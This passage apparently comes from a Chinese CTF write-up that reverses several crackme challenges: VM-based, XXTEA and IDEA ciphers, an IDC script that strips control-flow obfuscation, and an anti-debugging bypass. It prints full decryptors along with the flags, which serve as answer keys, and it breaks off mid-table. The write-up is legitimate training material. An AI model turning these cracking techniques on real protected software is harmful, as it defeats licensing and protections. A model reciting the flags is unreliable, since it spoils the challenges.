这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，

![](/images/37-1744626745338-42.png)

然后接着第二次加密，最后循环比较。

![](/images/38-1744626745338-44.png)

![](/images/39-1744626745338-43.png)

发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。

![](/images/40-1744626745338-45.png)

![](/images/41-1744626745338-46.png)

![](/images/42-1744626745338-48.png)

调试输出：

```cpp
Input[2] += 12;
Input[26] -= 85;
Input[35] -= 12;
Input[14] += 9;
Input[27] -= 6;
Input[6] ^= 5;
Input[1] ^= 5;
Input[27] += 14;
Input[25] += 3;
Input[26] += 4;
Input[4] ^= 8;
Input[3] -= 12;
Input[12] += 10;
Input[37] -= 2;
Input[32] -= 2;
Input[9] -= 12;
Input[26] ^= 5;
Input[4] += 13;
Input[8] ^= 15;
Input[10] += 14;
Input[16] -= 7;
Input[12] -= 7;
Input[34] ^= 8;
Input[21] ^= 10;
Input[39] -= 126;
Input[7] += 2;
Input[15] ^= 3;
Input[10] ^= 10;
Input[34] -= 11;
Input[18] += 8;
Input[25] += 9;
Input[14] ^= 6;
Input[0] ^= 5;
Input[10] -= 8;
Input[27] ^= 7;
Input[13] ^= 6;
Input[13] ^= 4;
Input[23] ^= 12;
Input[34] ^= 14;
Input[18] += 52;
Input[38] -= 119;
```

这也就是第一层加密的解密代码。

第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。

完整解密代码：

```cpp
#include <iostream>
#include <windows.h>

void decrypt_func(unsigned char *data, int len)
{
    unsigned char temp[40];
    memcpy(temp, data, 40);

    for (int i = 0; i < 10; i++)
    {
        int base = 4 * i;
        unsigned char block[4];

        if (base < len)
        {
            block[0] = ((temp[base + 2] & 0x1F) << 5) | (temp[base + 3] >> 3);
            block[1] = (temp[base] >> 3) | ((temp[base + 3] & 0x07) << 5);
            block[2] = ((temp[base] & 0x07) << 5) | (temp[base + 1] >> 3);
            block[3] = ((temp[base + 1] & 0x07) << 5) | (temp[base + 2] >> 3);

            for (int j = 0; j < 4 && base + j < len; j++)
            {
                data[base + j] = block[j];
            }
        }
    }
}

int main()
{
    unsigned char Input[48] = {
        0x4A, 0xAB, 0x9B, 0x1B, 0x61, 0xB1, 0xF3, 0x32, 0xD1, 0x8B, 0x73, 0xEB, 0xE9, 0x73, 0x6B, 0x22,
        0x81, 0x83, 0x23, 0x31, 0xCB, 0x1B, 0x22, 0xFB, 0x25, 0xC2, 0x81, 0x81, 0x73, 0x22, 0xFA, 0x03,
        0x9C, 0x4B, 0x5B, 0x49, 0x97, 0x87, 0xDB, 0x51};

    decrypt_func(Input, 40);
    Input[2] += 12;
    Input[26] -= 85;
    Input[35] -= 12;
    Input[14] += 9;
    Input[27] -= 6;
    Input[6] ^= 5;
    Input[1] ^= 5;
    Input[27] += 14;
    Input[25] += 3;
    Input[26] += 4;
    Input[4] ^= 8;
    Input[3] -= 12;
    Input[12] += 10;
    Input[37] -= 2;
    Input[32] -= 2;
    Input[9] -= 12;
    Input[26] ^= 5;
    Input[4] += 13;
    Input[8] ^= 15;
    Input[10] += 14;
    Input[16] -= 7;
    Input[12] -= 7;
    Input[34] ^= 8;
    Input[21] ^= 10;
    Input[39] -= 126;
    Input[7] += 2;
    Input[15] ^= 3;
    Input[10] ^= 10;
    Input[34] -= 11;
    Input[18] += 8;
    Input[25] += 9;
    Input[14] ^= 6;
    Input[0] ^= 5;
    Input[10] -= 8;
    Input[27] ^= 7;
    Input[13] ^= 6;
    Input[13] ^= 4;
    Input[23] ^= 12;
    Input[34] ^= 14;
    Input[18] += 52;
    Input[38] -= 119;
    printf("%.40s\n", Input);

    // flag{L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y} -> flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}
    return 0;
}
```

flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}

### EzObf

main_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。

混淆流程：

1. 执行真实指令
2. call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。
3. 给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。

之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。

deobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。

![](/images/43-1744626745338-47.png)

deobf idc脚本：

```cpp
static NopCode(Addr, Length)
{
    auto i;
    for (i = 0; i < Length; i++)
    {
        PatchByte(Addr + i, 0x90);
    }
}

static rol(value, count, bits = 32)
{
    count = count % bits;
    return ((value << count) | (value >> (bits - count))) & ((1 << bits) - 1);
}

// 搜索真实汇编代码的下一个地址
static FindEnd(Addr)
{
    auto i;
    for (i = 0; i < 0x90; i++)
    {
        auto v = Dword(Addr + i);
        if (v == 0x5153509C)
        {
            return Addr + i;
        }
    }
    return 0;
}

// 搜索最后的jmp rax指令
static FindJmpRax(Addr)
{
    auto i;
    for (i = 0; i < 0x90; i++)
    {
        auto v = Word(Addr + i);
        if (v == 0xE0FF)
        {
            return Addr + i;
        }
    }
    return 0;
}

// 搜索call $+5
static FindCall(Addr)
{
    auto i;
    for (i = 0; i < 0x90; i++)
    {
        auto v = Dword(Addr + i);
        if (v == 0xE8)
        {
            return Addr + i;
        }
    }
    return 0;
}

static main()
{
    auto StartAddr = 0x1401F400D;
    while (1)
    {
        // 搜索真实汇编代码的下一个指令地址
        auto EndAddr = FindEnd(StartAddr);
        if (EndAddr == 0)
        {
            break;
        }
        // 真实汇编代码的字节长度
        auto CodeLength = EndAddr - addr - 13;
        // 搜索Call $+5
        auto CallAddr = FindCall(addr + 13 + CodeLength);
        if (CallAddr == 0)
        {
            break;
        }
        // call $+5的下一条指令地址，即call时push到栈的返回地址
        auto CalcAddr = CallAddr + 5;
        auto ebx = Dword(CalcAddr + 2);
        auto rol_Value = Byte(CalcAddr + 8);
        auto Mode = Dword(CalcAddr + 9);
        ebx = rol(ebx, rol_Value);

        // 搜索最尾部的jmp rax指令地址
        auto JmpRaxAddr = FindJmpRax(addr);
        if (JmpRaxAddr == 0)
        {
            break;
        }
        // 第一部分垃圾指令长度
        auto TrushCodeLength_1 = CallAddr - (addr + 13 + CodeLength);
        // 第二部分垃圾指令长度
        auto TrushCodeLength_2 = JmpRaxAddr - CallAddr + 2;
        // Nop掉无用的所有代码
        NopCode(CallAddr, TrushCodeLength_2);

        NopCode(addr, 13);

        NopCode(addr + 13 + CodeLength, TrushCodeLength_1);
        // 一共两种地址计算，加和减
        if (Mode == 0xffC32B48)
        {
            CalcAddr = CalcAddr - ebx;
        }
        if (Mode == 0xffC30348)
        {
            CalcAddr = CalcAddr + ebx;
        }
        auto JmpCodeAddr = EndAddr;
        // 计算相对跳转地址
        auto JmpOffset = CalcAddr - JmpCodeAddr + 5;
        // 写入jmp指令
        PatchByte(JmpCodeAddr, 0xE9);
        PatchDword(JmpCodeAddr + 1, JmpOffset);
        // jmp的地址为下一次deobf起始地址
        addr = CalcAddr;
    }
}
```

执行完，把main_0剩余代码都手动nop即可。

![](/images/44-1744626745338-49.png)

然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。

从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。

![](/images/45-1744626745338-50.png)

![](/images/46-1744626745338-51.png)

Main函数原代码：

```cpp
int __fastcall main_0(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbp
  __int64 v4; // rdi
  __int64 i; // rcx
  _DWORD *v7; // rdi
  HANDLE CurrentProcess; // rax
  __int64 v9; // [rsp-20h] [rbp-458h] BYREF
  _DWORD v10[2]; // [rsp+0h] [rbp-438h] BYREF
  _BYTE v11[64]; // [rsp+8h] [rbp-430h] BYREF
  _BYTE *v12; // [rsp+48h] [rbp-3F0h]
  unsigned int v13; // [rsp+64h] [rbp-3D4h]
  int v14; // [rsp+84h] [rbp-3B4h]
  unsigned int v15; // [rsp+A4h] [rbp-394h]
  int v16; // [rsp+C4h] [rbp-374h]
  int v17; // [rsp+E4h] [rbp-354h]
  unsigned int k; // [rsp+104h] [rbp-334h]
  int v19; // [rsp+124h] [rbp-314h]
  int v20; // [rsp+144h] [rbp-2F4h]
  int v21; // [rsp+164h] [rbp-2D4h]
  _DWORD v22[11]; // [rsp+188h] [rbp-2B0h] BYREF
  unsigned __int16 v23; // [rsp+1B4h] [rbp-284h]
  BOOL v24; // [rsp+1D4h] [rbp-264h] BYREF
  unsigned __int64 j; // [rsp+1F8h] [rbp-240h]
  unsigned __int64 v26; // [rsp+218h] [rbp-220h]
  _DWORD v27[12]; // [rsp+238h] [rbp-200h]
  unsigned __int64 m; // [rsp+268h] [rbp-1D0h]
  int v29; // [rsp+3F4h] [rbp-44h]
  unsigned int v30; // [rsp+3F8h] [rbp-40h]
  int v31; // [rsp+3FCh] [rbp-3Ch]
  __int64 v32; // [rsp+400h] [rbp-38h]
  int v33; // [rsp+408h] [rbp-30h]
  unsigned __int64 v34; // [rsp+410h] [rbp-28h]
  __int64 v35; // [rsp+428h] [rbp-10h]
  __int64 v36; // [rsp+430h] [rbp-8h]

  v36 = v3;
  v35 = v4;
  v7 = v10;
  for ( i = 170; i; --i )
    *v7++ = -858993460;
  v34 = (unsigned __int64)v10 ^ 0x1401D9000LL;
  j___CheckForDebuggerJustMyCode(0x1401ED104LL);
  memset(v11, 0, 0x20u);
  sub_140087C02(0x1401A1190LL);
  if ( !IsDebuggerPresent() )
  {
    sub_1400868E3();
    v12 = v11;
    memset(v22, 0, 0x10u);
    v23 = 8;
    v29 = 8;
    v20 = 12;
    v15 = 0;
    v16 = 0x61C88646;
    v21 = 0x95664B48;
    v19 = 7;
    v24 = 0;
    CurrentProcess = GetCurrentProcess();
    CheckRemoteDebuggerPresent(CurrentProcess, &v24);
    if ( !v24 )
    {
      j_srand(0xAABBu);
      for ( j = 0; j < 4; ++j )
        v22[j] = j_rand();
      while ( 1 )
      {
        v29 = v19--;
        v30 = v29 != 0;
        if ( !v30 )
          break;
        v15 += v16;
        v17 = (v15 >> 2) & 3;
        for ( k = 0; k < v23; ++k )
        {
          v26 = __rdtsc();
          v13 = *(_DWORD *)&v12[4 * ((k + 1) % v23)];
          v29 = (4 * v13) ^ (*(_DWORD *)&v12[4 * ((k + v23 - 1) % v23)] >> 5);
          v30 = k + v23 - 1;
          v31 = ((16 * *(_DWORD *)&v12[4 * (v30 % v23)]) ^ (v13 >> 3)) + v29;
          v32 = ((unsigned __int8)v17 ^ (unsigned __int8)k) & 3;
          v33 = (((*(_DWORD *)&v12[4 * (v30 % v23)] ^ v22[v32]) + (v13 ^ v15)) ^ v31) + *(_DWORD *)&v12[4 * k];
          *(_DWORD *)&v12[4 * k] = v33;
          v14 = v33;
          if ( __rdtsc() - v26 > 0x83C0 )
            goto LABEL_20;
        }
      }
      v27[0] = 0xA9934E2F;
      v27[1] = 0x30B90FA;
      v27[2] = 0xDCBF1D3;
      v27[3] = 0x328B5BDE;
      for ( m = 0; m < 4; ++m )
      {
        if ( v27[m] != v10[m + 2] )
        {
          sub_140087C02(0x1401A11A8LL);
          j_system(byte_1401A11A0);
          goto LABEL_20;
        }
      }
      sub_140087C02(0x1401A11C0LL);
      j_system(byte_1401A11A0);
    }
  }
LABEL_20:
  j__RTC_CheckStackVars(&v9, (_RTC_framedesc *)&unk_1401A1140);
  j___security_check_cookie((unsigned __int64)v10 ^ v34);
  return sub_1401F8E9B();
}
```

很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。

**注：写WP时用的是旧版附件分析，缺失了后面16字节密文**

完整密文数据：

```cpp
0xa9934e2f, 0x30b90fa, 0xdcbf1d3, 0x328b5bde,
0x44fab4e, 0x1dcf0051, 0x85ebbe55, 0x93aa773a
```

解密代码：

```cpp
#include <iostream>
#define DELTA 0x61C88646
#define MX (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z)))

void xxtea(uint32_t *v, int n, uint32_t const key[4])
{
    uint32_t y, z, sum;
    unsigned p, rounds, e;
    if (n > 1) /* Coding Part */
    {
        rounds = 7;
        sum = 0;
        z = v[n - 1];
        do
        {
            sum += DELTA;
            e = (sum >> 2) & 3;
            for (p = 0; p < n - 1; p++)
            {
                y = v[p + 1];
                z = v[p] += MX;
                if (z == 0xA4F41487)
                    printf("11\n");
                if (y == 0xA4F41487)
                    printf("11\n");
            }
            y = v[0];
            z = v[n - 1] += MX;

        } while (--rounds);
    }
    else if (n < -1) /* Decoding Part */
    {
        n = -n;
        rounds = 7;
        sum = rounds * DELTA;
        y = v[0];
        do
        {
            e = (sum >> 2) & 3;
            for (p = n - 1; p > 0; p--)
            {
                z = v[p - 1];
                y = v[p] -= MX;
            }
            z = v[n - 1];
            y = v[0] -= MX;
            sum -= DELTA;
        } while (--rounds);
    }
}

int main()
{
    srand(0xAABB);
    uint32_t key[4]{};
    uint32_t Enc[]{
        0xa9934e2f, 0x30b90fa, 0xdcbf1d3, 0x328b5bde,
        0x44fab4e, 0x1dcf0051, 0x85ebbe55, 0x93aa773a};

    for (int i = 0; i < 4; i++)
    {
        key[i] = rand();
    }
    xxtea(Enc, -8, key);
    printf("%.32s\n", Enc);
    return 0;
}
```

flag{th15_15_51mpLe_obf_R19Ht?}

### CrackMe

有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。

![](/images/47-1744626745338-52.png)

![](/images/48-1744626745338-53.png)

从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。

![](/images/49-1744626745338-54.png)

![](/images/50-1744626745338-55.png)

![](/images/51-1744626745338-56.png)

![](/images/52-1744626745338-57.png)

从TLS那边可以看到启动了一个线程，线程函数如下

![](/images/53-1744626745339-58.png)

这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。

![](/images/54-1744626745339-59.png)

将这边v4都异或上0xBB会得到"flag{"五个字符，就明白这边是检测输入flag开头是否为"flag{"，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。

![](/images/55-1744626745339-60.png)

mark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。

这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。

![](/images/56-1744626745339-61.png)

爆破代码：

```cpp
  unsigned int box1[] = {
        0x00000000, 0xC0BA6CAC, 0x5A05DF1B, 0x9ABFB3B7, 0xB40BBE36, 0x74B1D29A,
        0xEE0E612D, 0x2EB40D81, 0xB3667A2F, 0x73DC1683, 0xE963A534, 0x29D9C998, 0x076DC419, 0xC7D7A8B5,
        0x5D681B02, 0x9DD277AE, 0xBDBDF21D, 0x7D079EB1, 0xE7B82D06, 0x270241AA, 0x09B64C2B, 0xC90C2087,
        0x53B39330, 0x9309FF9C, 0x0EDB8832, 0xCE61E49E, 0x54DE5729, 0x94643B85, 0xBAD03604, 0x7A6A5AA8,
        0xE0D5E91F, 0x206F85B3, 0xA00AE279, 0x60B08ED5, 0xFA0F3D62, 0x3AB551CE, 0x14015C4F, 0xD4BB30E3,
        0x4E048354, 0x8EBEEFF8, 0x136C9856, 0xD3D6F4FA, 0x4969474D, 0x89D32BE1, 0xA7672660, 0x67DD4ACC,
        0xFD62F97B, 0x3DD895D7, 0x1DB71064, 0xDD0D7CC8, 0x47B2CF7F, 0x8708A3D3, 0xA9BCAE52, 0x6906C2FE,
        0xF3B97149, 0x33031DE5, 0xAED16A4B, 0x6E6B06E7, 0xF4D4B550, 0x346ED9FC, 0x1ADAD47D, 0xDA60B8D1,
        0x40DF0B66, 0x806567CA, 0x9B64C2B1, 0x5BDEAE1D, 0xC1611DAA, 0x01DB7106, 0x2F6F7C87, 0xEFD5102B,
        0x756AA39C, 0xB5D0CF30, 0x2802B89E, 0xE8B8D432, 0x72076785, 0xB2BD0B29, 0x9C0906A8, 0x5CB36A04,
        0xC60CD9B3, 0x06B6B51F, 0x26D930AC, 0xE6635C00, 0x7CDCEFB7, 0xBC66831B, 0x92D28E9A, 0x5268E236,
        0xC8D75181, 0x086D3D2D, 0x95BF4A83, 0x5505262F, 0xCFBA9598, 0x0F00F934, 0x21B4F4B5, 0xE10E9819,
        0x7BB12BAE, 0xBB0B4702, 0x3B6E20C8, 0xFBD44C64, 0x616BFFD3, 0xA1D1937F, 0x8F659EFE, 0x4FDFF252,
        0xD56041E5, 0x15DA2D49, 0x88085AE7, 0x48B2364B, 0xD20D85FC, 0x12B7E950, 0x3C03E4D1, 0xFCB9887D,
        0x66063BCA, 0xA6BC5766, 0x86D3D2D5, 0x4669BE79, 0xDCD60DCE, 0x1C6C6162, 0x32D86CE3, 0xF262004F,
        0x68DDB3F8, 0xA867DF54, 0x35B5A8FA, 0xF50FC456, 0x6FB077E1, 0xAF0A1B4D, 0x81BE16CC, 0x41047A60,
        0xDBBBC9D7, 0x1B01A57B, 0xEDB88321, 0x2D02EF8D, 0xB7BD5C3A, 0x77073096, 0x59B33D17, 0x990951BB,
        0x03B6E20C, 0xC30C8EA0, 0x5EDEF90E, 0x9E6495A2, 0x04DB2615, 0xC4614AB9, 0xEAD54738, 0x2A6F2B94,
        0xB0D09823, 0x706AF48F, 0x5005713C, 0x90BF1D90, 0x0A00AE27, 0xCABAC28B, 0xE40ECF0A, 0x24B4A3A6,
        0xBE0B1011, 0x7EB17CBD, 0xE3630B13, 0x23D967BF, 0xB966D408, 0x79DCB8A4, 0x5768B525, 0x97D2D989,
        0x0D6D6A3E, 0xCDD70692, 0x4DB26158, 0x8D080DF4, 0x17B7BE43, 0xD70DD2EF, 0xF9B9DF6E, 0x3903B3C2,
        0xA3BC0075, 0x63066CD9, 0xFED41B77, 0x3E6E77DB, 0xA4D1C46C, 0x646BA8C0, 0x4ADFA541, 0x8A65C9ED,
        0x10DA7A5A, 0xD06016F6, 0xF00F9345, 0x30B5FFE9, 0xAA0A4C5E, 0x6AB020F2, 0x44042D73, 0x84BE41DF,
        0x1E01F268, 0xDEBB9EC4, 0x4369E96A, 0x83D385C6, 0x196C3671, 0xD9D65ADD, 0xF762575C, 0x37D83BF0,
        0xAD678847, 0x6DDDE4EB, 0x76DC4190, 0xB6662D3C, 0x2CD99E8B, 0xEC63F227, 0xC2D7FFA6, 0x026D930A,
        0x98D220BD, 0x58684C11, 0xC5BA3BBF, 0x05005713, 0x9FBFE4A4, 0x5F058808, 0x71B18589, 0xB10BE925,
        0x2BB45A92, 0xEB0E363E, 0xCB61B38D, 0x0BDBDF21, 0x91646C96, 0x51DE003A, 0x7F6A0DBB, 0xBFD06117,
        0x256FD2A0, 0xE5D5BE0C, 0x7807C9A2, 0xB8BDA50E, 0x220216B9, 0xE2B87A15, 0xCC0C7794, 0x0CB61B38,
        0x9609A88F, 0x56B3C423, 0xD6D6A3E9, 0x166CCF45, 0x8CD37CF2, 0x4C69105E, 0x62DD1DDF, 0xA2677173,
        0x38D8C2C4, 0xF862AE68, 0x65B0D9C6, 0xA50AB56A, 0x3FB506DD, 0xFF0F6A71, 0xD1BB67F0, 0x11010B5C,
        0x8BBEB8EB, 0x4B04D447, 0x6B6B51F4, 0xABD13D58, 0x316E8EEF, 0xF1D4E243, 0xDF60EFC2, 0x1FDA836E,
        0x856530D9, 0x45DF5C75, 0xD80D2BDB, 0x18B74777, 0x8208F4C0, 0x42B2986C, 0x6C0695ED, 0xACBCF941,
        0x36034AF6, 0xF6B9265A, 0xCCCCCCCC, 0xCCCCCC00, 0x00000100, 0x00000000, 0xF6B9265A, 0xCCCCCCCC,
        0x00000008, 0x00000000};

    uint32_t enc1[]{
        0x46A95BAD,
        0x1CAC84B6,
        0xA67CB2B2,
        0x32188937,
        0x4872D39F,
        0xF2A2E59B,
        0x011B94D2,
    };

    // 爆破前7字节
    for (int i = 0; i < 7; i++)
    {
        for (int c = 28; c < 132; c++)
        {
            if ((~box1[(uint8_t)c ^ 0x79] ^ 0xB0E0E879) == enc1[i])
            {
                printf("%c", c);
                break;
            }
        }
    }
```

得到前七个字符为：**moshui_**

第三次Check是在case 0处，程序起始的时候启了一个线程，死循环然后这边判断前两次Check是否成功，然后进入最后一次Check代码。

![](/images/57-1744626745339-63.png)

![](/images/58-1744626745339-62.png)

开始的时候利用前五个字节以及括号内前七个字节生成了两个四字节密钥，然后又赋值了另外两个固定的密钥值。

由于前五字节和括号内前七个字节是已知固定的，所以生成的密钥也是固定，可以直接提取计算完的密钥。

密钥：**0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF**

![](/images/59-1744626745339-64.png)

然后下面赋值了密文到v7，判断输入的字符串第29个字符是否为'}'，这边可知flag长度为29，然后利用密钥和输入字符串，进行加密，最后和v7判断。

![](/images/60-1744626745339-65.png)

加密是8字节8字节加密，观察sub_7FF7ADAB1640可知是IDEA加密算法，循环加密0x10000次没什么用，因为Input和Output在两个不同数组，所以和加密一次是一样结果。

利用IDEA解密算法配合密钥解密v7的值即可得到后16字节，最后拼接得到完整flag。

![](/images/61-1744626745339-66.png)

解密代码：

```cpp
#include <iostream>
#include <bitset>
#include <cmath>
#include <windows.h>
#include <algorithm>
using namespace std;

typedef bitset<16> code;
typedef bitset<128> key;

bitset<16> sub_key[52];
bitset<16> inv_sub_key[52];

code XOR(code code_1, code code_2)
{
    return code_1 ^ code_2;
}

code Plus(code code_1, code code_2)
{
    int tmp = 0;
    for (int i = 0; i < 16; i++)
    {
        tmp += code_1[i] * pow(2, i) + code_2[i] * pow(2, i);
    }
    tmp %= 65536;
    return bitset<16>(tmp);
}

code invPlus(code code_in)
{
    int tmp = 0;
    for (int i = 0; i < 16; i++)
        tmp += code_in[i] * pow(2, i);
    tmp = 65536 - tmp;
    return bitset<16>(tmp);
}

code Times(code code_1, code code_2)
{
    long long tmp_1 = 0, tmp_2 = 0;
    for (int i = 0; i < 16; i++)
    {
        tmp_1 += code_1[i] * pow(2, i);
        tmp_2 += code_2[i] * pow(2, i);
    }
    if (tmp_1 == 0)
        tmp_1 = 65536;
    if (tmp_2 == 0)
        tmp_2 = 65536;
    long long tmp = (tmp_1 * tmp_2) % 65537;
    return bitset<16>(tmp == 65536 ? 0 : tmp);
}

void Exgcd(int a, int b, int &x, int &y)
{
    if (!b)
        x = 1, y = 0;
    else
        Exgcd(b, a % b, y, x), y -= a / b * x;
}

code invTimes(code code_in)
{
    int tmp = 0;
    for (int i = 0; i < 16; i++)
        tmp += code_in[i] * pow(2, i);
    int x, y;
    int p = 65537;
    Exgcd(tmp, p, x, y);
    x = (x % p + p) % p;
    return bitset<16>(x);
}

void subkeys_get(code keys_input[8])
{
    key keys;
    for (int i = 0; i < 8; i++)
        for (int j = 0; j < 16; j++)
            keys[j + 16 * i] = keys_input[7 - i][j];

    for (int i = 0; i < 8; i++)
        for (int j = 0; j < 16; j++)
            sub_key[i][15 - j] = keys[127 - (j + 16 * i)];

    for (int i = 0; i < 5; i++)
    {
        key tmp_keys = keys >> 103;
        keys = (keys << 25) | tmp_keys;
        for (int j = (8 + 8 * i); j < (8 * (i + 2)); j++)
            for (int k = 0; k < 16; k++)
                sub_key[j][15 - k] = keys[127 - (k + 16 * (j - 8 - 8 * i))];
    }

    key tmp_keys = keys >> 103;
    keys = (keys << 25) | tmp_keys;
    for (int i = 48; i < 52; i++)
        for (int j = 0; j < 16; j++)
            sub_key[i][15 - j] = keys[127 - (j + 16 * (i - 48))];
}

void inv_subkeys_get(code sub_key[52])
{
    for (int i = 6; i < 48; i += 6)
    {
        inv_sub_key[i] = invTimes(sub_key[48 - i]);
        inv_sub_key[i + 1] = invPlus(sub_key[50 - i]);
        inv_sub_key[i + 2] = invPlus(sub_key[49 - i]);
        inv_sub_key[i + 3] = invTimes(sub_key[51 - i]);
    }

    for (int i = 0; i < 48; i += 6)
    {
        inv_sub_key[i + 4] = sub_key[46 - i];
        inv_sub_key[i + 5] = sub_key[47 - i];
    }

    inv_sub_key[0] = invTimes(sub_key[48]);
    inv_sub_key[1] = invPlus(sub_key[49]);
    inv_sub_key[2] = invPlus(sub_key[50]);
    inv_sub_key[3] = invTimes(sub_key[51]);

    inv_sub_key[48] = invTimes(sub_key[0]);
    inv_sub_key[49] = invPlus(sub_key[1]);
    inv_sub_key[50] = invPlus(sub_key[2]);
    inv_sub_key[51] = invTimes(sub_key[3]);
}

bitset<64> dencrypt(bitset<64> cipher)
{
    bitset<16> I_1, I_2, I_3, I_4;
    for (int i = 0; i < 16; i++)
    {
        I_1[15 - i] = cipher[63 - i];
        I_2[15 - i] = cipher[47 - i];
        I_3[15 - i] = cipher[31 - i];
        I_4[i] = cipher[i];
    }
    for (int i = 0; i < 48; i += 6)
    {
        bitset<16> tmp_1 = Times(inv_sub_key[i], I_1);
        bitset<16> tmp_2 = Plus(inv_sub_key[i + 1], I_2);
        bitset<16> tmp_3 = Plus(inv_sub_key[i + 2], I_3);
        bitset<16> tmp_4 = Times(inv_sub_key[i + 3], I_4);
        bitset<16> tmp_5 = XOR(tmp_1, tmp_3);
        bitset<16> tmp_6 = XOR(tmp_2, tmp_4);
        bitset<16> tmp_7 = Times(inv_sub_key[i + 4], tmp_5);
        bitset<16> tmp_8 = Plus(tmp_6, tmp_7);
        bitset<16> tmp_9 = Times(tmp_8, inv_sub_key[i + 5]);
        bitset<16> tmp_10 = Plus(tmp_7, tmp_9);
        I_1 = XOR(tmp_1, tmp_9);
        I_2 = XOR(tmp_3, tmp_9);
        I_3 = XOR(tmp_2, tmp_10);
        I_4 = XOR(tmp_4, tmp_10);
    }
    bitset<16> Y_1 = Times(I_1, inv_sub_key[48]);
    bitset<16> Y_2 = Plus(I_3, inv_sub_key[49]);
    bitset<16> Y_3 = Plus(I_2, inv_sub_key[50]);
    bitset<16> Y_4 = Times(I_4, inv_sub_key[51]);

    bitset<64> plaint;
    for (int i = 0; i < 16; i++)
    {
        plaint[i] = Y_4[i];
        plaint[i + 16] = Y_3[i];
        plaint[i + 32] = Y_2[i];
        plaint[i + 48] = Y_1[i];
    }
    return plaint;
}

int main()
{
    unsigned int box1[] = {
        0x00000000, 0xC0BA6CAC, 0x5A05DF1B, 0x9ABFB3B7, 0xB40BBE36, 0x74B1D29A,
        0xEE0E612D, 0x2EB40D81, 0xB3667A2F, 0x73DC1683, 0xE963A534, 0x29D9C998, 0x076DC419, 0xC7D7A8B5,
        0x5D681B02, 0x9DD277AE, 0xBDBDF21D, 0x7D079EB1, 0xE7B82D06, 0x270241AA, 0x09B64C2B, 0xC90C2087,
        0x53B39330, 0x9309FF9C, 0x0EDB8832, 0xCE61E49E, 0x54DE5729, 0x94643B85, 0xBAD03604, 0x7A6A5AA8,
        0xE0D5E91F, 0x206F85B3, 0xA00AE279, 0x60B08ED5, 0xFA0F3D62, 0x3AB551CE, 0x14015C4F, 0xD4BB30E3,
        0x4E048354, 0x8EBEEFF8, 0x136C9856, 0xD3D6F4FA, 0x4969474D, 0x89D32BE1, 0xA7672660, 0x67DD4ACC,
        0xFD62F97B, 0x3DD895D7, 0x1DB71064, 0xDD0D7CC8, 0x47B2CF7F, 0x8708A3D3, 0xA9BCAE52, 0x6906C2FE,
        0xF3B97149, 0x33031DE5, 0xAED16A4B, 0x6E6B06E7, 0xF4D4B550, 0x346ED9FC, 0x1ADAD47D, 0xDA60B8D1,
        0x40DF0B66, 0x806567CA, 0x9B64C2B1, 0x5BDEAE1D, 0xC1611DAA, 0x01DB7106, 0x2F6F7C87, 0xEFD5102B,
        0x756AA39C, 0xB5D0CF30, 0x2802B89E, 0xE8B8D432, 0x72076785, 0xB2BD0B29, 0x9C0906A8, 0x5CB36A04,
        0xC60CD9B3, 0x06B6B51F, 0x26D930AC, 0xE6635C00, 0x7CDCEFB7, 0xBC66831B, 0x92D28E9A, 0x5268E236,
        0xC8D75181, 0x086D3D2D, 0x95BF4A83, 0x5505262F, 0xCFBA9598, 0x0F00F934, 0x21B4F4B5, 0xE10E9819,
        0x7BB12BAE, 0xBB0B4702, 0x3B6E20C8, 0xFBD44C64, 0x616BFFD3, 0xA1D1937F, 0x8F659EFE, 0x4FDFF252,
        0xD56041E5, 0x15DA2D49, 0x88085AE7, 0x48B2364B, 0xD20D85FC, 0x12B7E950, 0x3C03E4D1, 0xFCB9887D,
        0x66063BCA, 0xA6BC5766, 0x86D3D2D5, 0x4669BE79, 0xDCD60DCE, 0x1C6C6162, 0x32D86CE3, 0xF262004F,
        0x68DDB3F8, 0xA867DF54, 0x35B5A8FA, 0xF50FC456, 0x6FB077E1, 0xAF0A1B4D, 0x81BE16CC, 0x41047A60,
        0xDBBBC9D7, 0x1B01A57B, 0xEDB88321, 0x2D02EF8D, 0xB7BD5C3A, 0x77073096, 0x59B33D17, 0x990951BB,
        0x03B6E20C, 0xC30C8EA0, 0x5EDEF90E, 0x9E6495A2, 0x04DB2615, 0xC4614AB9, 0xEAD54738, 0x2A6F2B94,
        0xB0D09823, 0x706AF48F, 0x5005713C, 0x90BF1D90, 0x0A00AE27, 0xCABAC28B, 0xE40ECF0A, 0x24B4A3A6,
        0xBE0B1011, 0x7EB17CBD, 0xE3630B13, 0x23D967BF, 0xB966D408, 0x79DCB8A4, 0x5768B525, 0x97D2D989,
